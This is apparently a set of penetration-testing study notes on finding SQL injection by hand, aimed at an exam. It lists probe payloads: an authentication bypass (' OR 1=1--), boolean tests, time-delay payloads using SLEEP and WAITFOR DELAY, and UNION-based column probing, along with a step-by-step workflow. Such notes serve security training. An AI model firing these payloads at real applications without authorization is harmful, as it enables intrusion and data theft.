## Advanced Injection Attacks — Finding SQL Injection Manually

## Objective
Identify SQL injection points without automation by:
- Observing behavior changes
- Triggering database responses
- Confirming injection manually

Think: *“Can I influence the SQL query and observe the effect?”*

---

## 1. Where to Test

- URL parameters:
```
/product?id=1
```

- POST data:
```json
{"id": 1}
```

- Headers:
```
User-Agent
Cookie
```

- JSON / API inputs

---

## 2. Initial Probing (Baseline)

### A. Add quote

```sql
'
"
```

→ Look for:
- SQL errors
- broken responses

---

### B. Comment test

```sql
--
#
/*
```

→ Does it change behavior?

---

## 3. Authentication Bypass Test

```sql
' OR 1=1--
" OR 1=1--
```

→ Login succeeds?

---

## 4. Boolean-Based Testing

### True vs False

```sql
1 AND 1=1
1 AND 1=2
```

---

### Observe

- Response content changes
- Different status codes
- Different lengths

---

## 5. Error-Based Detection

Trigger errors:

```sql
'
" 
'--
```

---

### Look for

- SQL syntax errors
- DB type (MySQL, PostgreSQL, etc.)
- File paths

---

## 6. Time-Based Testing

```sql
1 OR SLEEP(5)
1; WAITFOR DELAY '0:0:5'
```

---

### Observe

- Response delay → vulnerable

---

## 7. Union-Based Testing

### Step 1: Find column count

```sql
ORDER BY 1
ORDER BY 2
ORDER BY 3
```

→ Error when exceeding column count

---

### Step 2: Inject UNION

```sql
1 UNION SELECT 1,2,3--
```

---

### Step 3: Identify reflected columns

```sql
1 UNION SELECT 'a','b','c'--
```

---

## 8. Input Variation

### Try different types

```sql
1
'1'
1.0
-1
```

---

### Try injection in JSON

```json
{"id": "1 OR 1=1"}
```

---

## 9. Common Mistakes (Good for You)

- No input sanitization
- Direct string concatenation
- Trusting numeric inputs
- Filtering only quotes

---

## 10. Indicators of SQLi

- SQL errors in response
- Different output for true/false
- Time delays
- Authentication bypass
- Data leakage

---

## 11. Fast Workflow (Exam Mode)

1. Identify input
2. Send:
   - '
   - "
3. If error:
   → SQLi likely
4. Try:
   - OR 1=1
5. If no output:
   - boolean-based
   - time-based
6. If output:
   - union-based
7. Confirm injection

---

## 12. Mental Model

You are testing:

- Does input break query?
- Can I change logic?
- Can I extract data?

If yes:
→ You control the database interaction